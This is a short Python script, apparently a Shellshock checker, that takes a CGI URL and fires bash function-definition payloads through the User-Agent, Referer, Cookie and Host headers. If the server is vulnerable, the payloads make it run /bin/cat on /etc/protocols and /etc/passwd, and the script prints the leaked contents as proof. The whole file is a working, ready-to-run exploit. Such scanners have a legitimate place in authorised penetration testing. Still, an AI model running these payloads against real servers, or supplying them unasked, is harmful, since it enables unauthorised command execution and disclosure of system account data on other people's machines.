__author__ = 'p' + 'f' + 'o' + 'x' + '[at]' + 'q' + 'u' + 'a' + 'l' + 'y' + 's' + '.' + 'com'
from urlparse import urlparse
import sys

import requests
from bs4 import BeautifulSoup

## if not called with right params, exit
if (len(sys.argv)<=1) or (len(sys.argv)>2):
    print ('Usage: %s <URI>' % sys.argv[0])
    print ('Example: %s http://10.10.35.163/cgi-bin/example-bash.sh' % sys.argv[0])
    exit(0)

## Dict of payloads and list of header options
'''
1: list protocols from /etc/ on host
'''
payloads = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
            2:'() { (a)=>\' bash -c "echo date"',
            3:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd',
           }
http_headers = ['User-Agent', 'Referer', 'Cookie', 'Host']

#use urlparse to parse argument submitted by user
o = urlparse(sys.argv[1])
confirm = ' appears VULNERABLE!'
allClear = ' does not appear VULNERABLE.'

## for each payload, launch request to check for shellshock
for each in payloads:
    #parse url stored in o
    query = o.scheme + '://' + o.netloc + o.path
    #loop through each header type
    for heads in http_headers:
        #make the request and store results
        results = requests.get(query, headers={heads:payloads[each]})
        soup = BeautifulSoup(results.text)
        match = str(soup.body.p)
        if match != 'None':
            if 'tcp' in match:
                print ('Host: ' + query + confirm)
                print ('Payload: ' + str(heads) + ':' + str(payloads[each]))
                print(match[314:375])
            elif 'root' in match:
                print ('Host: ' + query + confirm)
                print ('Payload: ' + str(heads) + ':' + str(payloads[each]))
                print(match[3:35])
            else:
                print(match)
        else:
            print ('Host' + allClear)